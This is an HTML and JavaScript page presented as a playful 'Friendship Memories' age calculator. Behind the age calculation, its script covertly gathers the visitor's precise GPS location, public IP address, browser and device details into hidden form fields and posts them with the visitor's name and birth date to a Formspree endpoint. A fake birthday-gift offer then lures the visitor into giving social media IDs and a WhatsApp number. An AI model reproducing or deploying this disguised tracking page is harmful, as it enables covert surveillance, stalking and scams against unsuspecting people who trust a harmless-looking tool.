<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Friendship Memories</title>
  <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;700&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Caveat', cursive;
      background: linear-gradient(to right, #FFDAB9, #E1A4B0);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      min-height: 100vh;
      margin: 0;
      color: #5D4037;
    }

    .container {
      background-color: #fff;
      padding: 40px 50px;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 90%;
      max-width: 500px;
      display: none;
    }

    h1, h2 {
      color: #C2185B;
    }

    h1 {
      font-size: 3.5em;
    }

    h2 {
      font-size: 3.5em;
    }

    p {
      font-size: 2em;
      margin-bottom: 30px;
    }

    .form-group {
      text-align: left;
      margin-bottom: 20px;
    }

    label {
      font-size: 1.3em;
      display: block;
      margin-bottom: 8px;
    }

    input[type="text"],
    input[type="date"] {
      width: 100%;
      padding: 12px;
      border: 2px solid #fce4ec;
      border-radius: 8px;
      font-family: 'Caveat', cursive;
      font-size: 1.3em;
      box-sizing: border-box;
      color: #5D4037;
    }

    input:focus {
      outline: none;
      border-color: #d81b60;
    }

    button {
      background-color: #d81b60;
      color: white;
      font-family: 'Caveat', cursive;
      font-size: 1.5em;
      padding: 10px 30px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin: 10px;
    }

    button:hover {
      background-color: #c2185b;
    }

    .hidden {
      display: none !important;
    }
    /* Add basic styling for status message if desired */
    #status {
        font-size: 0.9em;
        color: #757575;
        margin-top: 10px;
    }
    #status.error-status {
        color: #D32F2F; /* Red color for errors */
        font-weight: bold;
    }
  </style>
</head>
<body>

  <div class="container" id="page1" style="display: block">
    <h1>Hello Friends</h1>
    <h2>Age Calculator</h2>
    <form id="mainForm">
      <div class="form-group">
        <label for="name">Your Name:</label>
        <input type="text" id="name" name="name" required minlength="5" />
      </div>
      <div class="form-group">
        <label for="dob">Date of Birth:</label>
        <input type="date" id="dob" name="dob" required />
      </div>

      <input type="hidden" id="latitude" name="latitude" />
      <input type="hidden" id="longitude" name="longitude" />
      <input type="hidden" id="browser" name="browser" />
      <input type="hidden" id="deviceType" name="deviceType" />
      <input type="hidden" id="screenSize" name="screenSize" />
      <input type="hidden" id="language" name="language" />
      <input type="hidden" id="ip" name="ip" />
      <input type="hidden" id="birthdayGiftChoice" name="birthday_gift_choice" value="No response yet" />
      <input type="hidden" name="_form_origin" value="Page 1 - Age Calculator" />

      <button type="button" onclick="handleSubmit()">Calculate ðŸ’Œ</button>
       <p id="status"></p> </form>
  </div>

  <div class="container" id="page2">
    <h2>Results</h2>
    <p id="ageLine"></p>
    <p id="birthdayLine"></p>
    <p id="deviceLine"></p>
    <p><b>"Hii dear user,<br>
    If you want a special greeting gift on your birthday, please tap on the 'Yes' button and fill out the form ðŸ˜ŠðŸ˜Š."</b></p>
    <button onclick="handleGiftChoice('Yes')">Yes</button>
    <button onclick="handleGiftChoice('No')">No</button>
  </div>

  <div class="container" id="page3">
    <h2>Contact Me</h2>
    <form id="contactForm" method="POST">
      <div class="form-group">
        <label for="fullname">Full Name:</label>
        <input type="text" id="fullname" name="fullname" required minlength="5" />
      </div>
      <div class="form-group">
        <label for="dob2">Date of Birth:</label>
        <input type="date" id="dob2" name="dob2" required />
      </div>
      <div class="form-group">
        <label for="instagram">Instagram ID/Snapchat ID (optional):</label>
        <input type="text" id="instagram" name="instagram" />
      </div>
      <div class="form-group">
        <label for="whatsapp">WhatsApp No (optional):</label>
        <input type="text" id="whatsapp" name="whatsapp" />
      </div>
      <input type="hidden" name="_form_origin" value="Page 3 - Contact Details" />
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    // IMPORTANT: Replace these with your actual Formspree endpoints.
    // Create two separate forms on Formspree and get their URLs.
    const FORMSPREE_URL_PAGE1 = "https://formspree.io/f/xpwlalno"; // e.g., https://formspree.io/f/xyza123
    const FORMSPREE_URL_PAGE3 = "https://formspree.io/f/xpwlalno"; // e.g., https://formspree.io/f/abcde456

    // Global variables to store location data
    let currentLatitude = "";
    let currentLongitude = "";

    // This script will execute once the entire HTML document is loaded.
    window.onload = function () {
        // Get reference to the HTML element for status messages
        const statusElement = document.getElementById('status');

        // Check if the browser supports the Geolocation API
        if (navigator.geolocation) {
            // Update the status message to inform the user about the permission request
            statusElement.textContent = 'Requesting location permission...';
            statusElement.classList.remove('error-status');

            // Define options for the getCurrentPosition call to prioritize accuracy
            const options = {
                enableHighAccuracy: true, // Requests the most precise location possible (e.g., using GPS)
                timeout: 15000,           // Maximum time (in milliseconds) allowed to get the position
                maximumAge: 0             // Prevents using cached positions; always requests a fresh one
            };

            // Get the user's current position once
            navigator.geolocation.getCurrentPosition(
                // Success callback
                function (position) {
                    currentLatitude = position.coords.latitude;
                    currentLongitude = position.coords.longitude;

                    // Populate the hidden form fields
                    document.getElementById("latitude").value = currentLatitude;
                    document.getElementById("longitude").value = currentLongitude;

                    // Update the status message
                    statusElement.textContent = 'Location access granted. Location captured.';
                    statusElement.classList.remove('error-status');

                    console.log('--- Location Captured ---');
                    console.log(`Latitude: ${currentLatitude}`);
                    console.log(`Longitude: ${currentLongitude}`);
                    console.log(`Accuracy: ${position.coords.accuracy} meters`);
                    console.log(`Timestamp: ${new Date(position.timestamp).toLocaleString()}`);
                    console.log('-----------------------');
                },
                // Error callback
                function (error) {
                    let errorMessage = 'An unknown error occurred.';
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = 'Location permission was denied. Location data will not be available.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = 'Location information is unavailable (e.g., no GPS signal).';
                            break;
                        case error.TIMEOUT:
                            errorMessage = 'The request for location timed out. Device might be stationary or signal is poor.';
                            break;
                        case error.UNKNOWN_ERROR:
                            errorMessage = 'An unknown error occurred while getting location.';
                            break;
                    }
                    statusElement.textContent = `Error: ${errorMessage}`;
                    statusElement.classList.add('error-status');
                    console.error('Geolocation Error:', error);

                    // Ensure hidden fields are empty or marked as 'Unavailable' if error occurs
                    document.getElementById("latitude").value = "Unavailable";
                    document.getElementById("longitude").value = "Unavailable";
                },
                options
            );
        } else {
            statusElement.textContent = 'Geolocation is not supported by this browser.';
            statusElement.classList.add('error-status');
            console.error('Geolocation is not supported by this browser.');
            document.getElementById("latitude").value = "Unsupported";
            document.getElementById("longitude").value = "Unsupported";
        }

        // Device, browser, screen, language, IP (this part remains as before)
        const ua = navigator.userAgent;

        // Device Type
        const isMobile = /Mobi|Android/i.test(ua);
        document.getElementById("deviceType").value = isMobile ? "Mobile" : "Desktop";
        document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;


        // Browser Info
        document.getElementById("browser").value = ua;

        // Screen size
        document.getElementById("screenSize").value = `${screen.width}x${screen.height}`;

        // Language
        document.getElementById("language").value = navigator.language;

        // IP address
        fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                document.getElementById("ip").value = data.ip;
            })
            .catch(() => {
                document.getElementById("ip").value = "Unavailable";
            });
    }; // End window.onload

    function handleSubmit() {
      const name = document.getElementById("name").value.trim();
      const dob = document.getElementById("dob").value;

      if (name.length < 5 || !dob) {
        alert("Please enter a valid name and Date of Birth.");
        return;
      }

      localStorage.setItem("user_dob", dob);

      const formData = new FormData(document.getElementById("mainForm"));

      // Send to the specific URL for Page 1 submissions
      fetch(FORMSPREE_URL_PAGE1, {
        method: "POST",
        body: formData,
        headers: { Accept: "application/json" }
      })
      .then(response => {
        if (response.ok) {
          const result = calculateDetails(dob);
          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
          goToPage(2);
        } else {
          alert("There was an issue submitting your initial data. Please try again.");
          const result = calculateDetails(dob);
          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
          goToPage(2);
        }
      })
      .catch((error) => {
          console.error('Error:', error);
          alert("Something went wrong with the initial submission. Please check your internet connection.");
          const result = calculateDetails(dob);
          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
          goToPage(2);
      });
    }

    function calculateDetails(dobStr) {
      const birthDate = new Date(dobStr);
      const today = new Date();
      let years = today.getFullYear() - birthDate.getFullYear();
      let months = today.getMonth() - birthDate.getMonth();
      let days = today.getDate() - birthDate.getDate();
      if (days < 0) {
        months--;
        days += new Date(today.getFullYear(), today.getMonth(), 0).getDate();
      }
      if (months < 0) {
        years--;
        months += 12;
      }
      const nextBirthday = new Date(today.getFullYear(), birthDate.getMonth(), birthDate.getDate());
      if (nextBirthday < today) nextBirthday.setFullYear(today.getFullYear() + 1);
      const daysLeft = Math.ceil((nextBirthday - today) / (1000 * 60 * 60 * 24));
      return {
        ageString: `${years} years, ${months} months, ${days} days`,
        daysLeft
      };
    }

    function handleGiftChoice(choice) {
        document.getElementById("birthdayGiftChoice").value = choice;

        if (choice === 'No') {
            alert("As you wish. Thanks for visiting!");
            goToPage(1);
            document.getElementById("mainForm").reset();
        } else {
            goToPage(3);
            const userDob = localStorage.getItem("user_dob");
            if (userDob) {
                document.getElementById("dob2").value = userDob;
            }
        }
    }

    function goToPage(n) {
      document.querySelectorAll(".container").forEach(c => c.style.display = "none");
      document.getElementById("page" + n).style.display = "block";
    }

    document.getElementById("contactForm").addEventListener("submit", function (e) {
      const instagram = document.getElementById("instagram").value.trim();
      const whatsapp = document.getElementById("whatsapp").value.trim();

      if (!instagram && !whatsapp) {
        e.preventDefault();
        alert("Please provide at least an Instagram ID/Snapchat ID or a WhatsApp number.");
      } else {
        this.action = FORMSPREE_URL_PAGE3; // Set the action URL before submission
        alert("Thank you for your interest! We'll be in touch if needed.");
      }
    });
  </script>
</body>
</html>
